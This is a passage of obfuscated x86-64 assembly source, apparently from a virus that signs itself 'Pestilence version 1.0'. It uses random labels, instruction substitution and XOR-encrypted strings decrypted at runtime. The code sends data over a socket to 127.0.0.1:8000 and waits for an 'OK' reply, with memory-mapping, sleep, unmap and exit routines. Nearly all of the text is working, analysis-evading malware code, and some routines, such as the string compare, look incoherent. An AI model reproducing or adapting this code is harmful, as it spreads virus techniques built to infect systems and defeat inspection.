push r15
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
push rdi
jmp XrnW8w
; manage H3YySA
CP7bRD54C:
push rbp
mov rbp, rsp 
call h8Qi6
cmp rax, 0 
jl nsizbQDnc
bwpApk:
;rdi == sockfd
push rax
push rax
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
push rdi
lea rdi, [rel ELvvuQy]
push rax
push AKwuU
call WmPZw
add rsp, 8
mov rsi, rax
pop rax
m0pmmY0:
call NHmPl
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov rsi, rax
pop rax
pop rdi
push SYS_SENDTO
call vQ68qNFE
add rsp, 8
push rax
push AKwuU
call WmPZw
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
test rax, rax
js nsizbQDnc
APkHZgCR:
push rdi
push 35
call ILtyMiUbi2
add rsp, 8
lea rdi, [rel YOnWLYNe]
xor rsi, rsi
syscall
pop rdi
DQEBNzBbTy:
;* rdi == sockfd
push SYS_RECVFROM
call ILtyMiUbi2
add rsp, 8
sub rsp, 200 
mov rsi, rsp
push rax
push 200
call vQ68qNFE
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
syscall
test rax, rax
js nsizbQDnc
qb9B3b5Fh:
;* rdi == sockfd
mov rsi, rsp
call sxeGem
push rax
push rsp
push rax
call wp8jCVLjoB
add rsp, 8
pop rsp
mov rsp, rax
pop rax
sub rsp, 2 
cmp WORD [rsp], 0x4b4f 
jne uQWHhc8zmg
nsizbQDnc:
call tyBXFZWQ
push 0
call EqhHKjPv8
add rsp, 8
jmp vtEQtVpK
uQWHhc8zmg:
call tyBXFZWQ
push -1
call WmPZw
add rsp, 8
jmp vtEQtVpK
;;**;;
ILtyMiUbi2:
push rcx
push rbx
mov rbx, qword [rsp + 8 + 16]

mov rax, 0
mov rcx, 0x3d42f
cmpxchg rbx, rcx

pop rbx
pop rcx
ret
WmPZw:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, (64 << 8) | 0 ; flag pour le mov de bextr
bextr rax, rcx, rdx ; mov rax, rcx

pop rdx
pop rcx
ret
vQ68qNFE:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, -1
bzhi rax, rcx, rdx

pop rdx
pop rcx
ret
EqhHKjPv8:
push rbx
push rcx
mov rcx, qword [rsp + 8 + 16]

mov rax, 0
mov rbx, 0
cmpxchg rbx, rcx
mov rax, rbx
pop rcx
pop rbx
ret
wp8jCVLjoB:
push rcx
mov rax, qword [rsp + 16 + 8]
mov rcx, qword [rsp + 8 + 8]

test rcx, rcx ; is rcx == 0 ?
jnz sub
jnc do_adc
jmp FRCJlAw0uU

sub:
sub rcx, 1
jnc FRCJlAw0uU ; Jump if Carry Flag is Not set (CF=0)
jmp do_adc ; Jump to ADC instruction
FRCJlAw0uU: 
cmc ; Complement CF, making it 1
do_adc: ; Perform ADC with prepared carry flag
adc rax, rcx; RAX = RAX + rcx + CF

pop rcx
ret
; rax: int *_map_int_table( void )
rUgiC:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
push SYS_MMAP
call WmPZw
add rsp, 8
push rax
push 0x0
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
push rax
push 0x1a0
call EqhHKjPv8
add rsp, 8
mov rsi, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call vQ68qNFE
add rsp, 8
mov rdx, rax
pop rax
push rax
push 0x22
call vQ68qNFE
add rsp, 8
mov r10, rax
pop rax
push rax
push -1
call ILtyMiUbi2
add rsp, 8
mov r8, rax
pop rax
push rax
push 0x0
call EqhHKjPv8
add rsp, 8
mov r9, rax
pop rax
syscall
cmp rax, -1
jl Dl7aFmdA
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000001
mov dword [rax + 80], 0x00000000
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00460000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00000000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00009800
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x02000000
mov dword [rax + 208], 0x00000000
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x00000000
mov dword [rax + 232], 0x004c0000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00021000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x00000000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x4b000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00000000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x1f400000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00009600
mov dword [rax + 292], 0x00000000
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x88000000
mov dword [rax + 312], 0x6e000040
mov dword [rax + 316], 0x00000001
mov dword [rax + 320], 0x00000101
mov dword [rax + 324], 0x2e010100
mov dword [rax + 328], 0x02010001
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00450100
mov dword [rax + 340], 0x01200000
mov dword [rax + 344], 0x00010100
mov dword [rax + 348], 0x01000001
mov dword [rax + 352], 0x00580005
mov dword [rax + 356], 0x0100010a
mov dword [rax + 360], 0x0a001001
mov dword [rax + 364], 0x23000101
mov dword [rax + 368], 0x4f02c8c8
mov dword [rax + 372], 0x00010000
mov dword [rax + 376], 0x01000001
mov dword [rax + 380], 0x3c30090a
mov dword [rax + 384], 0x401f0209
mov dword [rax + 388], 0x0a0d007f
mov dword [rax + 392], 0x08038000
mov dword [rax + 396], 0x2c2a290b
mov dword [rax + 400], 0xd9654d2d
mov dword [rax + 404], 0x40020100
mov dword [rax + 408], 0x12080400
mov dword [rax + 412], 0x08071713
Dl7aFmdA:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
NHmPl:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len oI9lH
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> oI9lH
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
push rax
push rdi
call WmPZw
add rsp, 8
mov rbx, rax
pop rax
push rax
push rsi
call EqhHKjPv8
add rsp, 8
mov r12, rax
pop rax
; addr = NULL (let kernel choose)
xor rdi, rdi 
; PROT_READ | PROT_WRITE = 1 | 2 = 3
push rax
push 0x03
call ILtyMiUbi2
add rsp, 8
mov rdx, rax
pop rax
; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
push rax
push 0x22
call WmPZw
add rsp, 8
mov r10, rax
pop rax
; L1RvGtLrvV = -1
push rax
push -1
call vQ68qNFE
add rsp, 8
mov r8, rax
pop rax
; offset = 0
xor r9, r9 
; syscall number for mmap
push 9
call ILtyMiUbi2
add rsp, 8
syscall
cmp rax, 0
jl j8OaOUy
push rax
push rax
call vQ68qNFE
add rsp, 8
mov r11, rax
pop rax
lea rsi, oI9lH
push rax
push 0xc
call WmPZw
add rsp, 8
mov r9, rax
pop rax
xor rcx, rcx
xor rdx, rdx
Oz19QP8C:
cmp rcx, r12
jge j8OaOUy
push rcx
call EqhHKjPv8
add rsp, 8
xor rdx, rdx
cmp rcx, 0
jne niwmptG
xor rax, rax
jmp dtTYfn
niwmptG:
div r9
dtTYfn:
; r10 == oI9lH[rcx % oI9lH_len]
movzx r10, byte [rsi + rdx] 
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp Oz19QP8C
j8OaOUy:
push r11
call ILtyMiUbi2
add rsp, 8
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
; strcpy(dst:rsi src: rdi)
lbUxk:
xor rcx, rcx
kWcyOSN:
cmp byte[rdi + rcx], 0 
je Is94Stvk3
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
push rax
push rcx
push 1
call wp8jCVLjoB
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp kWcyOSN
Is94Stvk3:
ret
wOENZptTF6:
call lbUxk
mov byte [rsi + rcx], 0 
ret
; strncpy(dst:rsi, src: rdi, count: rcx)
BxwtR:
sub rcx, 1 
n42VWf5Cn:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop n42VWf5Cn
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret
; strlen(str:rsi)
sxeGem:
xor rcx, rcx
y232umpn:
cmp byte [rsi + rcx], 0 
je elKFCHRG
inc rcx
jmp y232umpn
elKFCHRG:
push rcx
call EqhHKjPv8
add rsp, 8
ret
; strcmp(rdi, rsi)
DzETG2:
xor rcx, rcx
xor rax, rax
BzqqQGPy:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl mxPy6NW
je mxPy6NW
jg mxPy6NW
cmp al, 0 
je mxPy6NW
push rax
push rcx
push 1
call wp8jCVLjoB
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp BzqqQGPy
mxPy6NW:
movzx rax, al
movzx r8, bl
sub rax, r8
ret
; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
XKffqQW:
push rax
push 10
call WmPZw
add rsp, 8
mov r9, rax
pop rax
call n6kIwaxHt
ret
n6kIwaxHt:
cmp rax, 9 
jg GzCjhh
; mov [rsi], byte rax
mov [rsi], ax
add byte [rsi], 48 
inc rsi
ret
GzCjhh:
push rax
xor rdx, rdx
div r9
call n6kIwaxHt 
pop rax
push rax
xor rdx, rdx
div r9
push rdx
call vQ68qNFE
add rsp, 8
call n6kIwaxHt 
pop rax
ret
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov [rsi + rcx], rax
pop rax
vKOBQbe:
mov rdi, INF(H3YySA.hgLGl4n)
mov rsi, INF(H3YySA.IKSulmT)
push SYS_UNMAP
call ILtyMiUbi2
add rsp, 8
syscall
jmp Aa2ibij
Aa2ibij:
push SYS_CLOSE
call vQ68qNFE
add rsp, 8
mov rdi, INF(H3YySA.JaSrTu)
syscall
mov qword INF(H3YySA.JaSrTu), -1
jmp vtEQtVpK
zUtPd5W9X:
push 60
call WmPZw
add rsp, 8
xor rdi, rdi
syscall
oI9lH db 0x40, 0x5C, 0x26, 0x3E, 0x4A, 0x3C, 0x5E, 0x7D, 0x5E, 0x54, 0x23, 0x60
UQKaP2Et db 0x6F, 0x28, 0x4B, 0x4E, 0x65, 0x48, 0x3B, 0x0E, 0x2A, 0x54
HbeFqCY equ $ - UQKaP2Et
p8LLiw db 0x6F, 0x28, 0x4B, 0x4E, 0x65, 0x48, 0x3B, 0x0E, 0x2A, 0x66, 0x23
WCTxRh2O equ $ - p8LLiw
Fq1eHgJTXB db 9, 0x0 
tiEJeRF equ $ - Fq1eHgJTXB
XGFZlw db 0x6F, 0x5C
gFbtuc db 0x6F, 0x2E, 0x49, 0x51, 0x3E, 0x13, 0x70, 0x0E, 0x2D, 0x3C, 0x0C, 0x01, 0x35, 0x28, 0x4E, 0x51, 0x38, 0x55, 0x24, 0x18, 0x3A, 0x0B, 0x48, 0x05, 0x39, 0x2F, 0x26
XeJGp5Zjey equ $ - gFbtuc
X7VTHDoiTD db 0x33, 0x2F, 0x4E, 0x13, 0x2F, 0x58, 0x6C, 0x48, 0x6B, 0x65, 0x1A, 0x40, 0x01, 0x1D, 0x67, 0x7F, 0x09, 0x0F, 0x10, 0x07, 0x3F, 0x17, 0x12, 0x0C, 0x1A, 0x18, 0x6F, 0x0F, 0x04, 0x68, 0x1B, 0x48, 0x1F, 0x15, 0x62, 0x21, 0x09, 0x17, 0x45, 0x4D, 0x0E, 0x5E, 0x37, 0x07, 0x3F, 0x67, 0x77, 0x13, 0x76, 0x1E, 0x1F, 0x6A, 0x3A, 0x5F, 0x3B, 0x15, 0x26, 0x3E, 0x7A, 0x58, 0x30, 0x3F, 0x76, 0x57, 0x20, 0x52, 0x1A, 0x05, 0x1C, 0x24, 0x56, 0x09, 0x05, 0x37, 0x49, 0x4A, 0x18, 0x7F, 0x30, 0x4D, 0x7E, 0x33, 0x4C, 0x14, 0x34, 0x35, 0x43, 0x7E, 0x2E, 0x59, 0x3C, 0x14, 0x3F, 0x3A, 0x23
Z8M8JG1JeJ equ $ - X7VTHDoiTD
iWOKqz:
dw 2 
dw 0x401F 
dd 0x100007F 
dq 0 
Ein70fOjtX dq 0x10 
; Ein70fOjtX equ $ - iWOKqz
L5XcO db 0x10, 0x13, 0x75, 0x6A, 0x6A, 0x13, 0x3B, 0x05, 0x2A, 0x26, 0x42, 0x03, 0x34, 0x7C, 0x6E, 0x6A, 0x1E, 0x6C, 0x71, 0x4C, 0x70, 0x65, 0x2E, 0x6A, 0x08, 0x33, 0x55, 0x4A, 0x70, 0x1C, 0x6F, 0x4F, 0x69, 0x7A, 0x13, 0x4E, 0x70, 0x72, 0x17, 0x04, 0x72, 0x0C, 0x6E, 0x4D, 0x53, 0x5E, 0x60, 0x0F, 0x2E, 0x28, 0x43, 0x50, 0x3E, 0x11, 0x0A, 0x04, 0x2E, 0x31, 0x19, 0x40, 0x34, 0x39, 0x5E, 0x4A, 0x65, 0x4C, 0x32, 0x1C, 0x37, 0x3A, 0x2E, 0x6A, 0x03, 0x33, 0x48, 0x4A, 0x2F, 0x52, 0x2A, 0x50, 0x12, 0x31, 0x4D, 0x07, 0x34, 0x34, 0x1C, 0x1E, 0x4A
H5gnb8bLe equ $ - L5XcO
E36kXu db 0x0D, 0x0A, 0x0D, 0x0A, 0x0 
h9RFMA9tjM equ $ - E36kXu
ELvvuQy db 0x07, 0x19, 0x72, 0x1E, 0x65, 0x55, 0x30, 0x1B, 0x3B, 0x37, 0x57, 0x09, 0x2F, 0x32, 0x06, 0x76, 0x1E, 0x68, 0x0E, 0x52, 0x6F, 0x7A, 0x12, 0x6D, 0x4A, 0x14, 0x49, 0x4D, 0x3E, 0x06, 0x7E, 0x4C, 0x6C, 0x63, 0x0D, 0x50, 0x6E, 0x6C, 0x08, 0x0F, 0x70, 0x04, 0x6E, 0x4D, 0x6E, 0x59, 0x29, 0x6D, 0x4A, 0x5C
AKwuU equ $ - ELvvuQy
YOnWLYNe:
dq 0 
dq 10000000 
ztwRvxi db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0 
wrLSNWoXBn equ $ - ztwRvxi
ghCNAWt07:
